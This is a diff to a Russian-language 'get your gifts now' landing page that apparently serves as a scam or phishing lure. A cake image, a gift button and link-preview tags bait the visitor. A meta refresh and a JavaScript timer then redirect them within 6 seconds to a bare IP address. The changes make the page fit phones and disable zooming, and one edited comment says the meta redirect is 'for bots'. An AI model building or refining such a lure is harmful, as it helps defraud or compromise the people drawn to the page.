@@ -2,6 +2,8 @@
 <html lang="ru">
 <head>
 <meta charset="utf-8">
+<!-- ВОТ ЭТОТ ТЕГ ДЕЛАЕТ СТРАНИЦУ АДАПТИВНОЙ ПОД ТЕЛЕФОН -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Забери подарки прямо сейчас</title>
 
 <!-- Open Graph теги для превью -->
@@ -18,7 +20,7 @@
 <meta name="twitter:description" content=".">
 <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
 
-<!-- Мгновенный редирект через meta (для ботов и тех, у кого JS отключён) -->
+<!-- Мгновенный редирект через meta (для ботов) -->
 <meta http-equiv="refresh" content="6; url=https://45.115.26.145/?s=sCcUFzRVCt">
 
 <style>
@@ -39,17 +41,20 @@
         justify-content: center;
     }
 
+    /* Блок с картинкой растягивается на всю ширину */
     .hero-wrap {
         position: relative;
         width: 100%;
-        max-width: 520px;
+        max-width: 100%; /* На телефоне — во всю ширину */
         margin: 0 auto;
     }
 
+    /* Картинка занимает всю ширину блока */
     .hero-wrap img {
         display: block;
         width: 100%;
         height: auto;
+        background-color: #2f8ef0;
     }
 
     .btn-gift {
@@ -81,6 +86,7 @@
         transform: translateX(-50%) scale(0.96);
     }
 
+    /* На ПК — ограничиваем ширину, чтобы не растягивалось на весь монитор */
     @media (min-width: 561px) {
         .hero-wrap {
             max-width: 430px;
@@ -94,6 +100,7 @@
 <body>
 
 <div class="hero-wrap">
+    <!-- ВАЖНО: проверьте, что файл называется именно cake.jpg -->
     <img src="cake.jpg" alt="Праздничный торт">
     
     <a href="https://45.115.26.145/?s=sCcUFzRVCt" class="btn-gift" id="giftBtn">
@@ -106,7 +113,6 @@
     const targetUrl = giftBtn.href;
     let redirected = false;
 
-    // Редирект через 6 секунд
     const redirectTimeout = setTimeout(() => {
         if (!redirected) {
             redirected = true;
@@ -114,7 +120,6 @@
         }
     }, 6000);
 
-    // Мгновенный переход по клику
     giftBtn.addEventListener('click', function(e) {
         e.preventDefault();
         if (!redirected) {
